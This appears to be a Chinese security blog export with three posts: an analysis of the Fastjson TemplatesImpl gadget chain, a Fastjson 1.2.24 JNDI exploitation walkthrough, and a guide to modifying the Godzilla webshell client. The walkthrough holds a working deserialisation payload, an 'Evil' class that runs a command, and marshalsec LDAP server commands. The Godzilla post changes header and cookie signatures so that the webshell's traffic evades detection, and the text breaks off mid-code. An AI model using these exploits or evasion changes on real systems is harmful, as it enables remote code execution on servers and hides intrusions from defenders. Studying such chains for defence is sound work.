                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184542985.png"
                      class="" title="image-20250313184542985"
                > 

<p>也可以打上断点</p>
<p><strong>找哪里调用了defineClass</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184634203.png"
                      class="" title="image-20250313184634203"
                > 

<p>那我们就要找defineTransletClasses  <strong>一层一层往上找原因是肯定有一个setter方法或者getter方法里面一步一步调用这些函数到触发漏洞点的</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184749244.png"
                      class="" title="image-20250313184749244"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190343258.png"
                      class="" title="image-20250313190343258"
                > 

<p>这里有三个，都可以打上断点，都是get方法。所以我们可以调试一下了</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>TemplatesImpl这个类里面的方法</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190545878.png"
                      class="" title="image-20250313190545878"
                > 

<p>跟进newTransformer()</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190634787.png"
                      class="" title="image-20250313190634787"
                > 

<p>跟进getTransletInstance()</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190714628.png"
                      class="" title="image-20250313190714628"
                > 

<p>getTransletInstance 这个方法里面有defineTransletClasses，这里面可以知道我们想要进入defineTransletClasses，我们就需要满足</p>
<ul>
<li>_name!&#x3D;null</li>
<li>_class&#x3D;&#x3D;null</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190821863.png"
                      class="" title="image-20250313190821863"
                > 

<p>这里可以知道我们的_bytecodes就是恶意字节码不能为null</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190947571.png"
                      class="" title="image-20250313190947571"
                > 

<p>然后就走到我们加载恶意类的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313191045652.png"
                      class="" title="image-20250313191045652"
                > 

<p>走到我们的恶意类调用静态方法。</p>
<h3 id="分析poc"><a href="#分析poc" class="headerlink" title="分析poc"></a>分析poc</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313192102984.png"
                      class="" title="image-20250313192102984"
                > 

<ul>
<li>@type，是为了实例化TemplatesImpl这个函数并且调用它的类函数</li>
<li>_bytecodes是放恶意字节码让我们后面可以defineclass(_bytecodes)，加载恶意类</li>
<li>_name 是上面为了绕过if判断，if为空就不进那个判断语句</li>
<li>_tfactory是为了能让代码继续走下去不会报错<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247023186-6249d5fc-fbbb-491a-9123-2fd4265bb436-20250313192358337.png"
                      class=""
                > </li>
<li>_outputProperties这个属性就是为了反序列化的时候自动调用getter方法，他会拼接get+outputProperties&#x3D;getoutputProperties的方法进行调用，从而执行我们的利用链</li>
</ul>
]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson_JNDI</title>
    <url>/2025/03/12/Fastjson-jndi/</url>
    <content><![CDATA[<h1 id="Fastjson的JNDI利用"><a href="#Fastjson的JNDI利用" class="headerlink" title="Fastjson的JNDI利用"></a>Fastjson的JNDI利用</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>创建一个maven项目</li>
<li>导入所需要的fastjson的漏洞版本的包</li>
<li>高版本的jdk也可以，低版本也可以，高版本需要设置trustUrlCodebase为true</li>
</ul>
<p>需要导入的maven依赖</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class gadget &#123;</span><br><span class="line"></span><br><span class="line">    public static class test&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        //JDK高版本需要设置trustUrlCodebase为true，不然不会远程访问我们的恶意类</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Evil\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="搭建ldap服务"><a href="#搭建ldap服务" class="headerlink" title="搭建ldap服务"></a>搭建ldap服务</h3><h4 id="自写恶意类"><a href="#自写恶意类" class="headerlink" title="自写恶意类"></a>自写恶意类</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后会在target&#x2F;classes底下生成恶意类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312185947637.png"
                      class="" title="image-20250312185947637"
                > 

<h4 id="ldap恶意服务搭建"><a href="#ldap恶意服务搭建" class="headerlink" title="ldap恶意服务搭建"></a>ldap恶意服务搭建</h4><p>去到我们这个evil所在目录下起一个web服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190100351.png"
                      class="" title="image-20250312190100351"
                > 

<p><strong>python3 -m http.server 8899</strong> </p>
<p>然后我们用这个工具起一个ldap</p>
<p><a class="link"   href="https://github.com/RandomRobbieBF/marshalsec-jar/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar" >https://github.com/RandomRobbieBF/marshalsec-jar/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><strong>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a class="link"   href="http://127.0.0.1:8899/#Evil" >http://127.0.0.1:8899/#Evil<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190208040.png"
                      class="" title="image-20250312190208040"
                > 

<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>选择这个类作为漏洞类的原因是</p>
<p>fastjson反序列化的时候会自动调用setter方法去给我们的属性赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312192102668.png"
                      class="" title="image-20250312192102668"
                > 

<p>如果他自动调用了setAutoCommit，然后里面有个connect函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312192328524.png"
                      class="" title="image-20250312192328524"
                > 

<p>这里面有个nitialContext.lookup(this.getDataSourceName())函数，如果this.getDataSourceName()可以控制为jndi注入的两个协议的话，我们就可以实现fastjson反序列化打jndi</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行我们的反序列化代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190345419.png"
                      class="" title="image-20250312190345419"
                >

<p>弹出了计算器，虽然他报错了</p>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在parse函数上打上断点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190635856.png"
                      class="" title="image-20250312190635856"
                > 

<p>单步调试进入函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190715327.png"
                      class="" title="image-20250312190715327"
                > 

<h3 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190841821.png"
                      class="" title="image-20250312190841821"
                > 

<p>会进行一个jsonscanner的扫描</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190958548.png"
                      class="" title="image-20250312190958548"
                > 

<p>可以看到我们的参数给赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191056318.png"
                      class="" title="image-20250312191056318"
                > 

<h3 id="parser-parse"><a href="#parser-parse" class="headerlink" title="parser.parse()"></a>parser.parse()</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191214470.png"
                      class="" title="image-20250312191214470"
                > 

<p>会有个根据我们之前的lexer的token进行选择</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191301097.png"
                      class="" title="image-20250312191301097"
                > 

<p>走到case 12这里</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191318133.png"
                      class="" title="image-20250312191318133"
                > 

<h3 id="this-parseObject-Map-object-fieldName"><a href="#this-parseObject-Map-object-fieldName" class="headerlink" title="this.parseObject((Map)object, fieldName);"></a>this.parseObject((Map)object, fieldName);</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191536547.png"
                      class="" title="image-20250312191536547"
                > 

<p>这里可以看到关键的可控制类的@type和typename在这里面，然后去加载这个JdbcRowSetImpl这个类</p>
<p>然后会走到反序列化的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191713588.png"
                      class="" title="image-20250312191713588"
                > 

<p>然后这里好像会跑到ASM上？不是很懂，调试不了，所以后续将断点打在我们的调用类上面</p>
<p><strong>这里直接不调试，直接放行到后续我们打的断点处</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193039948.png"
                      class="" title="image-20250312193039948"
                > 

<h3 id="JdbcRowSetImpl-1"><a href="#JdbcRowSetImpl-1" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193001203.png"
                      class="" title="image-20250312193001203"
                > 

<p>然后就可以发现确实调用了set方法给我们的参数赋值，然后又因为var1为true，var1是在这里设置的true</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193142325.png"
                      class="" title="image-20250312193142325"
                > 

<p>后续我们进入connect</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193247029.png"
                      class="" title="image-20250312193247029"
                > 

<p>我们可以看一下getDataSourceName的参数长什么样</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193336054.png"
                      class="" title="image-20250312193336054"
                > 

<p>就是我们的ldap协议的恶意类地址</p>
<p>后续不细调了，跟前面的文章ldap一样的，走了多重的lookup函数最后我们的恶意类加载，跳过一些步骤</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193809716.png"
                      class="" title="image-20250312193809716"
                > 

<p>因为是ldap协议与前面rmi协议有些不一样，带着大家跟一下，可以一步一步使用二分的方法，如果哪里弹出了计算器，说明那个地方的函数实现了最终漏洞点，然后打上断点在单步调试进去看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193957296.png"
                      class="" title="image-20250312193957296"
                > 

<p>最后走到了漏洞触发点</p>
<p>DirectoryManager.getObjectInstance</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194343089.png"
                      class="" title="image-20250312194343089"
                > 

<p>获取我们的类的实例</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194553473.png"
                      class="" title="image-20250312194553473"
                > 

<p>这里loadclass加载我们的恶意类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194656230.png"
                      class="" title="image-20250312194656230"
                > 

<p>最后给我们的恶意类的静态方法打上断点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194825500.png"
                      class="" title="image-20250312194825500"
                > 

<p>发现走到了这里，并且弹出了计算器</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194841197.png"
                      class="" title="image-20250312194841197"
                >  



















]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Godzilla二次开发</title>
    <url>/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p><em>参考链接</em><a class="link"   href="https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502" >https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="下载godzilla源码并且反编译"><a href="#下载godzilla源码并且反编译" class="headerlink" title="下载godzilla源码并且反编译"></a>下载godzilla源码并且反编译</h3><p><a class="link"   href="https://github.com/BeichenDream/Godzilla/releases" >https://github.com/BeichenDream/Godzilla/releases<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p>反编译可以使用在线网站反编译</p>
<p><a class="link"   href="https://www.decompiler.com/" >https://www.decompiler.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672615872-49e68deb-4ef9-409a-a828-b336eec601eb.png"
                      class="" title="img"
                >

<p> 在线反编译平台把它丢进去就好了</p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>idea创建项目</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672691782-10349508-2b03-452e-98b9-462443d8e45b.png"
                      class="" title="img"
                >

<p>这样子就好了</p>
<p>然后将反编译出来的源码改的顺眼一点的名字改成godzilla</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672747089-5e3ddd04-32fb-4349-ac0a-54181beaef49.png"
                      class="" title="img"
                >

<p>复制这个目录</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672770133-e44ed91b-23e3-41d4-a932-7298f9eda80a.png"
                      class="" title="img"
                >

<p>鼠标选中根目录粘贴即可</p>
<p><em>新建一个lib文件夹</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672849319-5dec5ace-c812-447e-acae-a9f7dd4b17b1.png"
                      class="" title="img"
                >

<p> 将原本的jar下载下来的放进去右键添加为库</p>
<h3 id="配置工件"><a href="#配置工件" class="headerlink" title="配置工件"></a>配置工件</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672891521-4af08076-b409-4b1f-b1f4-ff538eb0eb8c.png"
                      class="" title="img"
                >

<p>项目结构选择工件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672909199-1c932ec3-8e03-4fde-b786-5f300537c3a3.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672922973-a2283f3e-5471-43f9-987d-8f7ae9a98d76.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672939050-5d6d2bbb-42fe-49f3-9405-8f0ec0d6f9dc.png"
                      class="" title="img"
                >

<p> 选中即可</p>
<h2 id="二次开发的步骤"><a href="#二次开发的步骤" class="headerlink" title="二次开发的步骤"></a>二次开发的步骤</h2><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673014484-20939626-e7d7-44a8-ab89-55e7517afc67.png"
                      class="" title="img"
                >

<p>此时src目录是空的</p>
<p>因为哥斯拉有个本身的哈希校验，所以我们得把那段代码注释掉</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673423776-9d4bd7a0-0faa-4498-b91c-6af383e2f4f2.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673107471-bd45cabe-aea6-4cb8-9fa3-591db8c0573e.png"
                      class="" title="img"
                >

<p>就是这个地方需要更改，所以我们需要按照目录结构把applicationconfig.java部署到src目录下</p>
<p><strong>原本的目录godzilla&#x2F;core&#x2F;ApplicationConfig.java</strong></p>
<p><strong>现在的目录src&#x2F;core&#x2F;ApplicationConfig.java</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673212453-e1e3e52c-51f1-4165-a0f5-c6f0dd8c3e8a.png"
                      class="" title="img"
                >

<p> 只有在src目录下更改的代码才有用！！！</p>
<h3 id="构建代码并运行"><a href="#构建代码并运行" class="headerlink" title="构建代码并运行"></a>构建代码并运行</h3><p>然后我们构建代码并运行即可</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673245542-fa40d05a-6094-41c4-ab9e-b456958e8f87.png"
                      class="" title="img"
                >

<p>补充这个地方需要勾选上<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673277351-c2222fb9-6e69-4420-8ac8-9373e7a01b01.png"
                      class="" title="img"
                ></p>
<p>此时就生成了我们修改后的jar</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673323996-f078c5e4-e0dd-45f3-9562-4c347e04f396.png"
                      class="" title="img"
                >

<p>成功运行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673341785-376adfdb-046e-4135-835f-ee07e2bca1e3.png"
                      class=""
                > 

<h2 id="header特征修改"><a href="#header特征修改" class="headerlink" title="header特征修改"></a>header特征修改</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>哥斯拉有个明显的特征</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673728998-51394f37-6aa2-4500-abee-58b5b2fc5a0b.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673670980-0bf8bb3a-4ab5-4520-8d66-f90449a2d215.png"
                      class=""
                > 

<h3 id="修改特征"><a href="#修改特征" class="headerlink" title="修改特征"></a>修改特征</h3><p><em>tips</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724466501-e8e30bfb-c87d-4afe-9761-4aa879cc44e5.png"
                      class="" title="img"
                >

<p>生成我们的测试木马的时候要选择带有base64的，因为aes加密是二进制的，所以我们burp里面会是乱码</p>
<h4 id="aes数据包"><a href="#aes数据包" class="headerlink" title="aes数据包"></a>aes数据包</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724533073-af561f86-d2fd-4cdb-b874-329c5f62f648.png"
                      class="" title="img"
                >

<h4 id="base64数据包"><a href="#base64数据包" class="headerlink" title="base64数据包"></a>base64数据包</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724550430-41513145-6fe6-49b4-88fc-1774d40170f5.png"
                      class="" title="img"
                > 

<h3 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h3><p>通过全局搜索发现accept和ua头的配置都在这里</p>
<p>godzilla&#x2F;core&#x2F;ui&#x2F;component&#x2F;frame&#x2F;ShellSetting.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673951489-bab984cc-c656-4138-8d62-392a80d92f23.png"
                      class="" title="img"
                >

<p>所以我们就更换到src目录下给他来个ua列表随机生成</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674040720-9406fcaa-5a6f-4c1a-b9ef-aa40f6f1e7fb.png"
                      class="" title="img"
                >

<p>修改的部份</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674101079-194adbbe-b956-4a00-9edd-e8f8d24ec1e3.png"
                      class="" title="img"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; userAgentList = Arrays.asList(</span><br><span class="line">                &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span><br><span class="line">        );</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        String randomUserAgent = userAgentList.get(random.nextInt(userAgentList.size()));</span><br></pre></td></tr></table></figure></div>

<p>构建目录运行即可</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724295269-2eba20cb-d20e-49e9-adcd-505313ff8117.png"
                      class="" title="img"
                >

<p>此时UA特征已经改变了</p>
<h3 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h3><p>godzilla&#x2F;util&#x2F;http&#x2F;HttpResponse.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674273595-78d1862c-ca81-4fcb-a10c-d0889f458b6c.png"
                      class="" title="img"
                >

<p>把这个点直接丢给gpt更改了，要求最后一个cookies的时候不要分号</p>
<p>src&#x2F;util&#x2F;http&#x2F;HttpResponse.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674485823-ea0928b2-9adb-46d4-9767-517314fe6221.png"
                      class="" title="img"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void handleHeader(Map&lt;String, List&lt;String&gt;&gt; map) &#123;</span><br><span class="line">    this.headerMap = map;</span><br><span class="line">    try &#123;</span><br><span class="line">        this.message = map.get(null).get(0);</span><br><span class="line">        Http http = this.shellEntity.getHttp();</span><br><span class="line">        http.getCookieManager().put(http.getUri(), map);</span><br><span class="line">        http.getCookieManager().getCookieStore().get(http.getUri());</span><br><span class="line">        </span><br><span class="line">        List&lt;HttpCookie&gt; cookies = http.getCookieManager().getCookieStore().get(http.getUri());</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        </span><br><span class="line">        // 遍历cookies并拼接</span><br><span class="line">        for (int i = 0; i &lt; cookies.size(); i++) &#123;</span><br><span class="line">            HttpCookie cookie = cookies.get(i);</span><br><span class="line">            sb.append(String.format(&quot;%s=%s&quot;, cookie.getName(), cookie.getValue()));</span><br><span class="line">            // 如果不是最后一个cookie，加上分号和空格</span><br><span class="line">            if (i &lt; cookies.size() - 1) &#123;</span><br><span class="line">                sb.append(&quot;; &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 如果有cookie，添加到headers中</span><br><span class="line">        if (sb.length() &gt; 0) &#123;</span><br><span class="line">            this.shellEntity.getHeaders().put(&quot;Cookie&quot;, sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch 